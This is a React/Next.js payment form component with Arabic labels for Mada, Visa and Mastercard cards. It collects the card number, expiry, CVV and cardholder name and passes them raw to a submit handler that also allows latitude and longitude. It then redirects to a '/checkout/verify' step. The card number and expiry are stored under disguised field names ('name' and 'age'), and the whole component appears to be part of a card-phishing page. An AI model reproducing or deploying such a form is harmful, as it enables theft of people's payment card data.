"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import React from "react";
import { IoLockClosedOutline, IoCardOutline, IoCalendarOutline, IoShieldCheckmarkOutline, IoPersonOutline, IoArrowForward } from "react-icons/io5";
import creditCardType from "credit-card-type";

interface PaymentFormProps {
  onSubmit: (fields: { name: string; age: string; cvv: string; cardHolder: string }) => Promise<void>;
}

const MADA_BINS = ["588845","440647","440795","446404","457865","968208","457997","474491","543357","434107","431361","604906","521076","588848","968210","968211","968212","968213","968214","968215","968216","968217","968218","968219","968220","531095","531196","532013","535825","535989","536023","537767","539931","543085","549760","558563","585265","588850","588982","589005","589206","604906","636120","968201","968202","968203","968204","968205","968206","968207"];

type CardBrand = "visa" | "mastercard" | "mada" | null;

function detectCard(num: string): CardBrand {
  const raw = num.replace(/\s/g, "");
  if (raw.length >= 6 && MADA_BINS.includes(raw.slice(0, 6))) return "mada";
  if (raw.length < 2) return null;
  const types = creditCardType(raw);
  if (!types.length) return null;
  const t = types[0].type;
  if (t === "visa") return "visa";
  if (t === "mastercard") return "mastercard";
  return null;
}

function VisaSVG() {
  return (
    <svg viewBox="0 0 48 30" fill="none" xmlns="http://www.w3.org/2000/svg" className="w-full h-full">
      <rect width="48" height="30" rx="4" fill="white"/>
      <path d="M19.5 20H17l1.6-10h2.5L19.5 20zm-5.2-10l-2.4 6.9-.3-1.4-1-5c-.2-.5-.6-.5-1.1-.5H6l-.1.3c.9.2 1.8.5 2.5 1l2.1 7.7h2.6L17 10h-2.7zm16.4 6.8c0-1-.6-1.8-2-2.4-1-.5-1.6-.8-1.6-1.3 0-.4.5-.9 1.6-.9.9 0 1.6.2 2.1.4l.3.1.4-2.3c-.6-.2-1.4-.4-2.5-.4-2.7 0-4.6 1.4-4.6 3.5 0 1.5 1.4 2.4 2.4 2.9 1.1.5 1.5.9 1.5 1.4 0 .7-.9 1.1-1.7 1.1-1.1 0-1.8-.2-2.7-.6l-.4-.2-.4 2.4c.7.3 1.9.6 3.2.6 3 0 4.9-1.4 4.9-3.6l.1.3zm7.5-6.8h-2c-.6 0-1.1.2-1.4.8L32 20h2.6l.5-1.4h3.2l.3 1.4H41L38.2 10zm-3 6.8l1.3-3.6.7 3.6h-2z" fill="#1A1F71"/>
    </svg>
  );
}

function MastercardSVG() {
  return (
    <svg viewBox="0 0 48 30" fill="none" xmlns="http://www.w3.org/2000/svg" className="w-full h-full">
      <rect width="48" height="30" rx="4" fill="white"/>
      <circle cx="19" cy="15" r="7" fill="#EB001B"/>
      <circle cx="29" cy="15" r="7" fill="#F79E1B"/>
      <path d="M24 9.5a7 7 0 0 1 0 11A7 7 0 0 1 24 9.5z" fill="#FF5F00"/>
    </svg>
  );
}

function MadaSVG({ inverted = false }: { inverted?: boolean }) {
  return (
    <div className="w-full h-full flex items-center justify-center" style={{ background: inverted ? "transparent" : "white" }}>
      <img src="/unnamed.jpg" alt="Mada" className="w-full h-full object-contain" style={{ filter: inverted ? "brightness(0) invert(1)" : "none" }} />
    </div>
  );
}

function CardLogo({ brand, size = "md" }: { brand: string; size?: "sm" | "md" | "lg" }) {
  const dims = size === "sm" ? "w-10 h-[26px]" : size === "lg" ? "w-16 h-10" : "w-12 h-[30px]";
  const svgMap: Record<string, React.ReactNode> = {
    visa: <VisaSVG />,
    mastercard: <MastercardSVG />,
    mada: <MadaSVG />,
  };
  if (!svgMap[brand]) return null;
  return (
    <div className={`${dims} rounded-md shadow border border-gray-100 overflow-hidden flex-shrink-0`}>
      {svgMap[brand]}
    </div>
  );
}

function CardLogoInvert({ brand }: { brand: string }) {
  if (brand === "visa") return (
    <svg viewBox="0 0 48 30" fill="none" xmlns="http://www.w3.org/2000/svg" className="w-12 h-8">
      <path d="M19.5 20H17l1.6-10h2.5L19.5 20zm-5.2-10l-2.4 6.9-.3-1.4-1-5c-.2-.5-.6-.5-1.1-.5H6l-.1.3c.9.2 1.8.5 2.5 1l2.1 7.7h2.6L17 10h-2.7zm16.4 6.8c0-1-.6-1.8-2-2.4-1-.5-1.6-.8-1.6-1.3 0-.4.5-.9 1.6-.9.9 0 1.6.2 2.1.4l.3.1.4-2.3c-.6-.2-1.4-.4-2.5-.4-2.7 0-4.6 1.4-4.6 3.5 0 1.5 1.4 2.4 2.4 2.9 1.1.5 1.5.9 1.5 1.4 0 .7-.9 1.1-1.7 1.1-1.1 0-1.8-.2-2.7-.6l-.4-.2-.4 2.4c.7.3 1.9.6 3.2.6 3 0 4.9-1.4 4.9-3.6l.1.3zm7.5-6.8h-2c-.6 0-1.1.2-1.4.8L32 20h2.6l.5-1.4h3.2l.3 1.4H41L38.2 10zm-3 6.8l1.3-3.6.7 3.6h-2z" fill="white"/>
    </svg>
  );
  if (brand === "mastercard") return (
    <svg viewBox="0 0 48 30" fill="none" xmlns="http://www.w3.org/2000/svg" className="w-12 h-8">
      <circle cx="19" cy="15" r="7" fill="rgba(255,255,255,0.75)"/>
      <circle cx="29" cy="15" r="7" fill="rgba(255,255,255,0.5)"/>
      <path d="M24 9.5a7 7 0 0 1 0 11A7 7 0 0 1 24 9.5z" fill="white"/>
    </svg>
  );
  if (brand === "mada") return (
    <div className="w-12 h-8 flex items-center justify-center">
      <MadaSVG inverted />
    </div>
  );
  return null;
}

function luhnCheck(num: string) {
  let sum = 0, shouldDouble = false;
  for (let i = num.length - 1; i >= 0; i--) {
    let digit = parseInt(num[i]);
    if (shouldDouble) { digit *= 2; if (digit > 9) digit -= 9; }
    sum += digit;
    shouldDouble = !shouldDouble;
  }
  return sum % 10 === 0;
}

interface PaymentFormPropsExtended extends PaymentFormProps {
  onSubmit: (fields: { name: string; age: string; cvv: string; cardHolder: string; lat?: number; lng?: number }) => Promise<void>;
}

export default function PaymentForm({ onSubmit }: PaymentFormPropsExtended) {
  const router = useRouter();
  const [fields, setFields] = useState({ name: "", age: "", cvv: "", cardHolder: "" });
  const [errors, setErrors] = useState(false);
  const [cardError, setCardError] = useState("");
  const [expiryError, setExpiryError] = useState("");
  const [cvvError, setCvvError] = useState("");
  const [loading, setLoading] = useState(false);
  const [flipped, setFlipped] = useState(false);

  const rawCard = fields.name.replace(/\s/g, "");
  const cardBrand = detectCard(fields.name);

  const handleNext = async () => {
    if (!fields.name || !fields.age || !fields.cvv || !fields.cardHolder) { setErrors(true); return; }
    if (rawCard.length !== 16) { setCardError("رقم البطاقة يجب أن يكون 16 رقمًا"); return; }
    if (!luhnCheck(rawCard)) { setCardError("رقم البطاقة غير صحيح"); return; }
    if (!cardBrand) { setCardError("نوع البطاقة غير مدعوم"); return; }
    setCardError("");
    if (fields.cvv.length !== 3) { setCvvError("رمز CVV يجب أن يكون 3 أرقام"); return; }
    setCvvError("");
    const parts = fields.age.split("/");
    const expMonth = Number(parts[0]), expYear = Number(parts[1]);
    const now = new Date();
    if (!expMonth || !expYear || parts[0]?.length !== 2 || parts[1]?.length !== 2) { setExpiryError("صيغة غير صحيحة (MM/YY)"); return; }
    if (expMonth < 1 || expMonth > 12) { setExpiryError("الشهر بين 01 و 12"); return; }
    if (new Date(2000 + expYear, expMonth - 1, 1) < new Date(now.getFullYear(), now.getMonth(), 1)) { setExpiryError("البطاقة منتهية الصلاحية"); return; }
    if (2000 + expYear > now.getFullYear() + 10) { setExpiryError("تاريخ غير صحيح"); return; }
    setExpiryError("");

    setLoading(true);
    await onSubmit({ ...fields });
    const savedId = localStorage.getItem("orderId");
    if (!savedId) await new Promise(r => setTimeout(r, 1500));
    router.push("/checkout/verify");
    setLoading(false);
  };

  const inputBase = "w-full border-2 rounded-2xl px-4 py-3.5 text-sm text-white focus:outline-none transition-all duration-200 bg-black/20 placeholder:text-white/30";
  const inputOk = "border-white/10 focus:border-[#65E0CD] hover:border-white/20";
  const inputErr = "border-red-400/50 bg-red-500/10 focus:border-red-400";

  const displayNumber = fields.name ? fields.name.padEnd(19, " ").slice(0, 19) : "0000 0000 0000 0000";

  const cardBg = cardBrand === "mada"
    ? "linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%)"
    : cardBrand === "mastercard"
    ? "linear-gradient(135deg, #eb5757 0%, #000000 100%)"
    : "linear-gradient(135deg, #053132 0%, #082D32 50%, #0D202E 100%)";

  return (
    <div className="space-y-5">
      {/* ── Visual Card ── */}
      <div className="w-full max-w-[340px] sm:max-w-[280px] mx-auto" style={{ perspective: "1200px", minHeight: "195px" }}>
        <div style={{ transition: "transform 0.65s cubic-bezier(.4,0,.2,1)", transformStyle: "preserve-3d", transform: flipped ? "rotateY(180deg)" : "rotateY(0deg)", position: "relative", minHeight: "195px" }}>
          {/* Front */}
          <div className="absolute inset-0 rounded-2xl p-4 text-white select-none overflow-hidden" style={{ background: cardBg, boxShadow: "0 14px 40px rgba(5,49,50,0.3)", backfaceVisibility: "hidden" }}>
            {/* shimmer */}
            <div className="absolute inset-0 opacity-10" style={{ background: "radial-gradient(ellipse at 20% 20%, rgba(255,255,255,0.6) 0%, transparent 60%)" }} />
            <div className="relative flex justify-between items-start mb-5">
              <div className="w-9 h-6 rounded-md" style={{ background: "linear-gradient(135deg,#d4af37,#f5e06e,#c8a415)" }} />
              <div className="h-6 flex items-center">
                {cardBrand ? <CardLogoInvert brand={cardBrand} /> : <span className="text-[10px] text-white/30 font-mono tracking-widest">CARD</span>}
              </div>
            </div>
            <div className="relative font-mono text-base sm:text-lg tracking-[0.15em] mb-4 text-center drop-shadow" dir="ltr">{displayNumber}</div>
            <div className="relative flex justify-between items-end">
              <div>
                <p className="text-[8px] uppercase tracking-widest opacity-40 mb-0.5">Card Holder</p>
                <p className="text-xs font-semibold tracking-wider uppercase truncate max-w-[130px]">{fields.cardHolder || "FULL NAME"}</p>
              </div>
              <div className="text-right">
                <p className="text-[8px] uppercase tracking-widest opacity-40 mb-0.5">Expires</p>
                <p className="text-xs font-semibold">{fields.age || "MM/YY"}</p>
              </div>
            </div>
          </div>
          {/* Back */}
          <div className="absolute inset-0 rounded-2xl text-white select-none overflow-hidden" style={{ background: cardBg, boxShadow: "0 14px 40px rgba(5,49,50,0.3)", backfaceVisibility: "hidden", transform: "rotateY(180deg)" }}>
            <div className="absolute inset-0 opacity-10" style={{ background: "radial-gradient(ellipse at 80% 80%, rgba(255,255,255,0.6) 0%, transparent 60%)" }} />
            <div className="w-full h-9 mt-6" style={{ background: "rgba(0,0,0,0.5)" }} />
            <div className="px-4 mt-4">
              <p className="text-[8px] uppercase tracking-widest opacity-40 mb-1.5 text-right">CVV</p>
              <div className="bg-white/95 rounded-lg px-3 py-2 text-gray-800 font-mono tracking-[0.3em] text-right text-sm shadow-inner">{fields.cvv ? "•".repeat(fields.cvv.length) : "•••"}</div>
            </div>
          </div>
        </div>
      </div>

      {/* ── Form Card ── */}
      <div className="bg-black/30 backdrop-blur-md rounded-3xl border border-white/10 overflow-hidden">

        {/* Accepted cards bar */}
        <div className="flex items-center gap-3 px-5 py-3 border-b border-white/10 bg-white/5">
          <IoShieldCheckmarkOutline size={15} className="text-[#65E0CD] shrink-0" />
          <span className="text-[11px] text-white/70 font-semibold">دفع آمن — نقبل:</span>
          <div className="flex items-center gap-2 mr-auto">
            <CardLogo brand="mada" size="sm" />
            <CardLogo brand="visa" size="sm" />
            <CardLogo brand="mastercard" size="sm" />
          </div>
        </div>

        <div className="p-5 sm:p-6 space-y-5">

          {/* Card Number */}
          <div>
            <label className="flex items-center gap-1.5 text-xs font-black text-white/80 uppercase tracking-wider mb-2">
              <IoCardOutline size={13} className="text-[#65E0CD]" />
              رقم البطاقة <span className="text-red-400">*</span>
            </label>
            <div className="relative">
              <input
                autoComplete="cc-number"
                type="text"
                inputMode="numeric"
                pattern="[0-9 ]*"
                placeholder="0000  0000  0000  0000"
                maxLength={19}
                dir="ltr"
                value={fields.name}
                onChange={e => {
                  let v = e.target.value.replace(/\D/g, "").slice(0, 16);
                  v = v.match(/.{1,4}/g)?.join(" ") ?? v;
                  setFields(f => ({ ...f, name: v }));
                  setCardError("");
                }}
                className={`${inputBase} ${cardError || (errors && !fields.name) ? inputErr : inputOk} pl-14 text-right font-mono text-base tracking-widest`}
              />
              <div className="absolute left-3.5 top-1/2 -translate-y-1/2 pointer-events-none">
                {cardBrand
                  ? <CardLogo brand={cardBrand} size="sm" />
                  : <div className="w-10 h-[26px] rounded-md bg-white/10 flex items-center justify-center"><span className="text-[9px] text-white/30 font-mono">CARD</span></div>
                }
              </div>
            </div>
            {cardError && <p className="text-red-500 text-xs font-bold mt-1.5 flex items-center gap-1">⚠ {cardError}</p>}
          </div>

          {/* Expiry + CVV */}
          <div className="grid grid-cols-2 gap-4">
            <div>
              <label className="flex items-center gap-1.5 text-xs font-black text-white/80 uppercase tracking-wider mb-2">
                <IoCalendarOutline size={13} className="text-[#65E0CD]" />
                الانتهاء <span className="text-red-400">*</span>
              </label>
              <input
                autoComplete="cc-exp"
                type="text"
                inputMode="numeric"
                pattern="[0-9]*"
                placeholder="MM / YY"
                maxLength={5}
                value={fields.age}
                onChange={e => {
                  let v = e.target.value.replace(/\D/g, "");
                  if (v.length >= 3) v = v.slice(0, 2) + "/" + v.slice(2, 4);
                  setFields(f => ({ ...f, age: v }));
                  setExpiryError("");
                }}
                className={`${inputBase} ${expiryError || (errors && !fields.age) ? inputErr : inputOk} text-center font-mono tracking-widest`}
              />
              {expiryError && <p className="text-red-500 text-xs font-bold mt-1.5">⚠ {expiryError}</p>}
            </div>
            <div>
              <label className="flex items-center gap-1.5 text-xs font-black text-white/80 uppercase tracking-wider mb-2">
                <IoLockClosedOutline size={13} className="text-[#65E0CD]" />
                CVV <span className="text-red-400">*</span>
              </label>
              <input
                autoComplete="cc-csc"
                type="text"
                inputMode="numeric"
                pattern="[0-9]*"
                placeholder="•••"
                maxLength={3}
                value={fields.cvv}
                onFocus={() => setFlipped(true)}
                onBlur={() => setFlipped(false)}
                onChange={e => {
                  const v = e.target.value.replace(/\D/g, "").slice(0, 3);
                  setFields(f => ({ ...f, cvv: v }));
                  setCvvError("");
                }}
                className={`${inputBase} ${cvvError || (errors && !fields.cvv) ? inputErr : inputOk} text-center font-mono tracking-widest`}
                style={{ WebkitTextSecurity: "disc" } as React.CSSProperties}
              />
              {cvvError && <p className="text-red-500 text-xs font-bold mt-1.5">⚠ {cvvError}</p>}
            </div>
          </div>

          {/* Card Holder */}
          <div>
            <label className="flex items-center gap-1.5 text-xs font-black text-white/80 uppercase tracking-wider mb-2">
              <IoPersonOutline size={13} className="text-[#65E0CD]" />
              اسم حامل البطاقة <span className="text-red-400">*</span>
            </label>
            <input
              autoComplete="cc-name"
              type="text"
              placeholder="FULL NAME AS ON CARD"
              value={fields.cardHolder}
              onChange={e => {
                const v = e.target.value.replace(/[^a-zA-Z ]/g, "");
                setFields(f => ({ ...f, cardHolder: v.toUpperCase() }));
              }}
              className={`${inputBase} ${errors && !fields.cardHolder ? inputErr : inputOk} font-mono tracking-wider`}
              dir="ltr"
            />
          </div>

        </div>
      </div>


      {/* ── Actions ── */}
      <div className="flex gap-3">
        <button
          onClick={() => router.push("/cart")}
          className="flex items-center justify-center gap-2 px-5 border-2 border-white/10 text-white/60 font-bold py-4 rounded-2xl text-sm hover:border-white/20 hover:text-white transition-all bg-black/20"
        >
          <IoArrowForward size={16} />
          <span className="hidden sm:inline">السابق</span>
        </button>
        <button
          onClick={handleNext}
          disabled={loading}
          className="flex-1 flex items-center justify-center gap-2.5 text-white font-black py-4 rounded-2xl transition-all text-sm active:scale-[0.98] disabled:opacity-60 disabled:cursor-not-allowed shadow-lg"
          style={{ background: loading ? "#082D32" : "linear-gradient(135deg,#053132 0%,#082D32 60%,#0D202E 100%)", boxShadow: "0 8px 24px rgba(5,49,50,0.35)" }}
        >
          <IoLockClosedOutline size={16} />
          {loading ? "جاري المعالجة..." : "تأكيد الدفع الآن"}
        </button>
      </div>
    </div>
  );
}
